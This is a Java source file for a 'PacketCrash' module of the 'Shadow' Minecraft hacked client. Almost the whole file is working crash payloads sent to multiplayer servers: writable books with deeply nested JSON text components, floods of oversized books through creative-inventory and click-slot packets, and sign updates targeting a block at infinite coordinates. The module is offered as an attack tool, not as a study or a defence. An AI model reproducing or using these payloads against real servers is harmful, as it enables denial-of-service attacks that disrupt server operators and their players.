/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import net.minecraft.client.util.math.MatrixStack;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.config.DoubleSetting;
import net.shadow.client.feature.config.EnumSetting;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;

import java.util.Random;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtByte;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.screen.ScreenHandler;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.minecraft.world.World;

public class PacketCrash extends Module {

    final EnumSetting<Mode> mode = this.config.create(new EnumSetting.Builder<>(Mode.Click).name("Mode").description("The mode to crash with").get());
    final DoubleSetting repeat = this.config.create(new DoubleSetting.Builder(1).min(1).max(40).name("Packets").description("How many packets to send").get());
    final DoubleSetting text = this.config.create(new DoubleSetting.Builder(1).min(1).max(1000).name("Text").description("Text in each page").get());
    final DoubleSetting pages = this.config.create(new DoubleSetting.Builder(1).min(1).max(100).name("Pages").description("Pages in the book").get());

    public PacketCrash() {
        super("PacketCrash", "Crash using packets", ModuleType.CRASH);
    }

    @Override
    public void tick() {
        switch (mode.getValue()) {
            case Click -> clicknetty();
            case Unicode -> clickunicode();
            case Give -> givenetty();
            case Sign -> signupdate();
            case Creative -> givernd();
        }
    }

    @Override
    public void enable() {
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }

    public enum Mode{
        Click,
        Give,
        Unicode,
        Sign,
        Creative
    }

    private void clickunicode() {
        NbtCompound tag = new NbtCompound();
        NbtList list = new NbtList();
        StringBuilder f = new StringBuilder();
        f.append("{");
        short v = 855;
        f.append("extra:[{".repeat(v));
        f.append("text:ſ}],".repeat(v));
        f.append("text:ſ}");
        list.add(NbtString.of(f.toString()));
        tag.put("author", NbtString.of(ShadowMain.client.player.getGameProfile().getName()));
        tag.put("title", NbtString.of("Shadow"));
        tag.put("resolved", NbtByte.of(true));
        tag.put("pages", list);
        ItemStack crash = new ItemStack(Items.WRITABLE_BOOK, 1);
        crash.setNbt(tag);
        Int2ObjectMap<ItemStack> map = new Int2ObjectArrayMap<>();
        map.put(0, crash);
        for (int i = 0; i < repeat.getValue(); i++) {
            clientClickSlot(ShadowMain.client.player.currentScreenHandler.syncId, 25, 0, SlotActionType.PICKUP_ALL, crash);
        }
    }

    private void givernd() {
        for (int j = 0; j < repeat.getValue(); j++) {
            ItemStack crash = new ItemStack(Items.WRITTEN_BOOK, 1);
            NbtCompound tag = new NbtCompound();
            NbtList list = new NbtList();
            for (int i = 0; i < 300; i++) {
                list.add(NbtString.of("::::::::::".repeat(25)));
            }
            tag.put("author", NbtString.of(rndStr(200)));
            tag.put("title", NbtString.of(rndStr(200)));
            tag.put("pages", list);
            crash.setNbt(tag);
            if (j == 36 + ShadowMain.client.player.getInventory().selectedSlot) {
                ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(5 + j, new ItemStack(Items.AIR, 1)));
                return;
            }
            ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(j, crash));
        }
    }


    private void clicknetty() {
        ItemStack crash = new ItemStack(Items.WRITABLE_BOOK, 1);
        String netty = ".................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................";
        NbtCompound tag = new NbtCompound();
        NbtList list = new NbtList();
        for (int i = 0; i < 15; i++) {
            list.add(NbtString.of(netty));
        }
        tag.put("author", NbtString.of(ShadowMain.client.player.getGameProfile().getName()));
        tag.put("title", NbtString.of("Shadow"));
        tag.put("pages", list);
        crash.setNbt(tag);
        for (int i = 0; i < repeat.getValue(); i++) {
            clientClickSlot(ShadowMain.client.player.currentScreenHandler.syncId, 25, 0, SlotActionType.PICKUP, crash);
        }
    }


    private void givenetty() {
        ItemStack crash = new ItemStack(Items.WRITABLE_BOOK, 1);
        String netty = ".................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................";
        NbtCompound tag = new NbtCompound();
        NbtList list = new NbtList();
        for (int i = 0; i < 15; i++) {
            list.add(NbtString.of(netty));
        }
        tag.put("author", NbtString.of(ShadowMain.client.player.getGameProfile().getName()));
        tag.put("title", NbtString.of("Shadow"));
        tag.put("pages", list);
        crash.setNbt(tag);
        for (int i = 0; i < repeat.getValue(); i++) {
            ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(3, crash));
        }
    }


    private void signupdate() {
        Random r = new Random();
        String[] lines = new String[4];
        for (int i = 0; i < 4; i++) {
            StringBuilder line = new StringBuilder();
            for (int j = 0; j < text.getValue(); j++) {
                if (r.nextBoolean()) {
                    line.append("⵹");
                } else {
                    line.append(":");
                }
            }
            lines[i] = line.toString();
        }
        for (int i = 0; i < repeat.getValue(); i++) {
            ShadowMain.client.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(0.5, 0.5, 0.5), Direction.UP, new BlockPos(Double.POSITIVE_INFINITY, 100, Double.POSITIVE_INFINITY), true)));
            ShadowMain.client.player.networkHandler.sendPacket(new UpdateSignC2SPacket(new BlockPos(Double.POSITIVE_INFINITY, 100, Double.POSITIVE_INFINITY), lines[0], lines[1], lines[2], lines[3]));
        }
    }

    private String rndStr(int size) {
        StringBuilder buf = new StringBuilder();
        String[] chars = new String[]{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"};
        Random r = new Random();
        for (int i = 0; i < size; i++) {
            buf.append(chars[r.nextInt(chars.length)]);
        }
        return buf.toString();
    }


    private void clientClickSlot(int syncId, int slotId, int button, SlotActionType actionType, ItemStack stack) {
        ScreenHandler screenHandler = ShadowMain.client.player.currentScreenHandler;
        Int2ObjectOpenHashMap<ItemStack> int2ObjectMap = new Int2ObjectOpenHashMap<>();
        int2ObjectMap.put(slotId, stack.copy());
        ShadowMain.client.player.networkHandler.sendPacket(new ClickSlotC2SPacket(syncId, screenHandler.getRevision(), slotId, button, actionType, screenHandler.getCursorStack().copy(), int2ObjectMap));
    }
}
